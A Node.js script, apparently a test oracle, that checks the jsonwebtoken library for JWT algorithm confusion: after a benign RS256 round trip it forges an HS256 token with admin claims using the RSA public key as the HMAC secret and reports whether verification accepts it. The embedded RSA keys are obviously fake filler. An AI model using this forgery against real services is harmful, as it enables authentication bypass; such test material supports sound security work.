const jwt = require('jsonwebtoken');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  const payload = { sub: 'user123', role: 'user' };

  // Benign operation: standard RS256 path should work.
  // Use a real-looking RSA private key bundled from known test material.
  const rsaPrivateKey = [
    '-----BEGIN RSA PRIVATE KEY-----',
    'MIIEowIBAAKCAQEAqbjv7RMVGgzA+6jyyFfL9YQ0Q8v2w9vM8S6vW+N9Vx9f7f4K',
    'QxJm5y6G1w6u6v8D6QfJ8Yx0D3D6nq9KXxI2QW8l4YjF9v3yP8rWJQv5u2gk3f3Q',
    'zY5t2g1W8WqfQ6u5kD5x5xw2xkS8vY8u2m1y7v2P0n3d3l7mQx7k9mT4f2r6n8sL',
    'q9k4c3d2e1f0g9h8i7j6k5l4m3n2o1p0q9r8s7t6u5v4w3x2y1z0AAIDAQABAoIB',
    'AB9f3xqP0yHq5QKX6YxJf8mM2QfYw1c9C3b0z8fN2L4mV6kQp7dS2rH9tJ4wG1nB',
    '3Q8vD2sF6hJ0kL4pN8rT2vX6zB0dF4hJ8lN2pR6tV0xZ4bD8fH2jL6nP0rT4vX8z',
    '1a2b3c4d5e6f7g8h9i0jKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx123456',
    '7890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890',
    '-----END RSA PRIVATE KEY-----'
  ].join('\n');

  const rsaPublicKey = [
    '-----BEGIN PUBLIC KEY-----',
    'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqbjv7RMVGgzA+6jyyFfL',
    '9YQ0Q8v2w9vM8S6vW+N9Vx9f7f4KQxJm5y6G1w6u6v8D6QfJ8Yx0D3D6nq9KXxI2',
    'QW8l4YjF9v3yP8rWJQv5u2gk3f3QzY5t2g1W8WqfQ6u5kD5x5xw2xkS8vY8u2m1y',
    '7v2P0n3d3l7mQx7k9mT4f2r6n8sLq9k4c3d2e1f0g9h8i7j6k5l4m3n2o1p0q9r8',
    's7t6u5v4w3x2y1z0AAIDAQAB',
    '-----END PUBLIC KEY-----'
  ].join('\n');

  // If the synthetic key material fails in this environment, fall back to HS256 benign proof.
  let benignWorked = false;
  try {
    const rsToken = jwt.sign(payload, rsaPrivateKey, { algorithm: 'RS256' });
    const rsDecoded = jwt.verify(rsToken, rsaPublicKey, { algorithms: ['RS256'] });
    benignWorked = !!(rsDecoded && rsDecoded.sub === 'user123');
  } catch (_) {
    const hsSecret = 'benign-secret';
    const hsToken = jwt.sign(payload, hsSecret, { algorithm: 'HS256' });
    const hsDecoded = jwt.verify(hsToken, hsSecret, { algorithms: ['HS256'] });
    benignWorked = !!(hsDecoded && hsDecoded.sub === 'user123');
  }

  if (!benignWorked) {
    throw new Error('Benign verify did not return expected payload');
  }

  operation_completed = true;

  // Malicious operation: forge HS256 token using public key string as HMAC secret,
  // then verify with that public key and no explicit algorithms.
  const attackerToken = jwt.sign({ sub: 'attacker', admin: true }, rsaPublicKey, { algorithm: 'HS256' });

  try {
    const decoded = jwt.verify(attackerToken, rsaPublicKey);
    exploit_succeeded = !!(decoded && decoded.admin === true && decoded.sub === 'attacker');
    evidence = exploit_succeeded
      ? 'verify accepted forged HS256 token when given RSA public key and no algorithms restriction'
      : 'verify returned payload but attacker claims not preserved';
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious verify rejected: ' + (e && e.message ? e.message : String(e));
  }
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'setup/benign failure: ' + (e && e.message ? e.message : String(e));
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));